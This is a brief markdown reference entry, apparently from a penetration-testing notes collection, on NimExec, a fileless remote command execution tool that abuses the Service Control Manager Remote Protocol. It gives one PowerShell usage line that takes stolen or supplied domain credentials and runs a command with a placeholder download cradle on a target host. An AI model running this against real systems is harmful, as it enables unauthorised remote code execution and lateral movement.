---
tags:
  - tool
---
# NimExec

[NimExec](https://github.com/frkngksl/NimExec) is a fileless remote command execution tool that operates by exploiting the Service Control Manager Remote Protocol (MS-SCMR).

## Capabilities

```powershell
# Connect and execute a command
.\NimExec -d $DOMAIN -u $USER -p '$PASSWD' -t $IP -c 'cmd.exe /c $CRADLE' -v
```
